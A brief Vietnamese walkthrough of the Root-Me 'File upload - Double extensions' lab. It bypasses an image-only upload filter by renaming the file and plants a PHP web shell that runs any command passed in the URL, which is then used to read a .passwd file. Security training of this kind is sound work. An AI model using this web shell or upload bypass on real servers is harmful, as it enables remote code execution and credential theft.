## Link challenge: [File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)

Vào challenge ta không thể upload các file ngoài các loại tệp hình ảnh `.jpeg, .gif, .png`. Ta sửa luôn đuôi file thành .png và upload lại là được luôn.

Thử với đoạn code thử ls - la, ta thu đc kết quả:

![img1](https://i.imgur.com/PCK8bGR.png)

Để thuận tiện hơn, nhập command line ta sửa đoạn code thành:

```
<?php
$output = system($_GET['command']);
echo "<pre>$output</pre>";
?>

```

Thêm `?command=...` phía cuối url là được. Ta directory travesal ta tìm được đường dẫn tới file `.passwd` và ta cat file là đọc được:

![img2](https://i.imgur.com/fPRwMIv.png)